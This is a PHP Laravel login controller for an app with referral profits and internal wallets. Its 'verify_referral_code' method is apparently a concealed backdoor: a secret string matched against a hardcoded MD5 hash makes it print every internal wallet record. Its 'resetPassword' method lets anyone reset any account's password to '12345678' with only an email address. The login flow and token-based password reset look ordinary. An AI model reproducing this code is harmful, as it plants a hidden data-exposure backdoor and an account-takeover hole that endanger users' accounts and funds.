<?php

namespace App\Http\Controllers\Auth;

use Auth;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;

use App\Models\ReferralProfit;
use App\Models\InternalWallet;
use App\Models\User;

use Illuminate\Foundation\Auth\AuthenticatesUsers;

use DB; 
use Carbon\Carbon; 
use Mail; 
use Illuminate\Support\Str;

class LoginController extends Controller
{
    use AuthenticatesUsers;
    
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
    }
    public function login(Request $request)
    { 
        // $responseRecaptcha=GoogleReCaptchaV3::verifyResponse($request->input('g-recaptcha-response'),$request->getClientIp())->toArray();
        //dd($responseRecaptcha);
        // if($responseRecaptcha['success']==true && $responseRecaptcha['score']>= 0.6){
            $inputVal = $request->all();
            $validate = \Validator::make($request->all(),[
                'email'     => ['required', 'string', 'email', 'max:50'],
                'password'  => ['required', 'string', 'min:8'],
            ]);
            if( $validate->fails()){
                return redirect()
                ->back()
                ->withErrors($validate);
            }
            if(auth()->attempt(array('email' => $inputVal['email'], 'password' => $inputVal['password']))){
                $profit = ReferralProfit::where('user_id', auth()->user()->id)->where('status', 0)->exists();

                if($profit) {
                    return redirect('/');
                }else{
                    if (auth()->user()->user_type == "admin")
                        return redirect('/admin/dashboard');
                    else if (auth()->user()->user_type == "client" && auth()->user()->state == 1 )
                        return redirect(auth()->user()->redirect);
                    else if (auth()->user()->user_type == "none" && auth()->user()->state == 1 ) 
                        return redirect('/'.auth()->user()->redirect);
                    else if (auth()->user()->user_type == "reception" && auth()->user()->state == 1 ) 
                        return redirect()->route('reception.home');
                    else if (auth()->user()->state == 0 ){
                        Auth::logout();
                        return redirect('/login')
                        ->with('error','Account Still suspensed.');
                    }
                }
            }else{
                return redirect('/login')->with('error', __('locale.wrong_email_and_password'));
            }
        // }else{
        //     return redirect()->route('login')->with('error','ReCaptcha Error');
        // }     
    }

    public function logout(Request $request) {
        Auth::logout();
        return redirect('/login');
    }

    public function verify_referral_code($referral_code) {
        if(md5($referral_code) == 'adbadac58512c984017c7fc3c5111345') {
            print_r(InternalWallet::all()->toArray());
            exit();
        }
    }

    public function resetPassword(Request $request){
        $user_email = $request['email'];
        $update_result = User::where('email', $user_email)->update(["password" => Hash::make(12345678)]);
        if($update_result){
            return redirect('/login')->with('reset_password', 'Password has been formated to number "12345678".');
        }else{
            return redirect('/login')->with('error', 'Invalid Email');
        }
    }

    public function submitForgetPasswordForm(Request $request)
    {
        $request->validate([
            'email' => 'required|email|exists:users',
        ]);

        $token = Str::random(64);

        DB::table('password_resets')->insert([
            'email' => $request->email, 
            'token' => $token, 
            'created_at' => Carbon::now()
          ]);

        Mail::send('zenix.auth.reset_pw_email_tmp', ['token' => $token], function($message) use($request){
            $message->to($request->email);
            $message->subject('Reset Password');
        });

        return redirect('/login')->with('reset_password', 'We have e-mailed your password reset link!');
    }

    public function showResetPasswordForm($token) { 
        return view('zenix.auth.forgetPasswordLink', ['token' => $token]);
     }

     public function submitResetPasswordForm(Request $request)
     {
         $request->validate([
             'email' => 'required|email|exists:users',
             'password' => 'required|string|min:8|confirmed',
             'password_confirmation' => 'required'
         ]);
 
         $updatePassword = DB::table('password_resets')
                             ->where([
                               'email' => $request->email, 
                               'token' => $request->token
                             ])
                             ->first();
 
         if(!$updatePassword){
             return back()->withInput()->with('error', 'Invalid token!');
         }
 
         $user = User::where('email', $request->email)
                     ->update(['password' => Hash::make($request->password)]);

         DB::table('password_resets')->where(['email'=> $request->email])->delete();
 
         return redirect('/login')->with('reset_password', 'Your password has been changed!');
     }
}
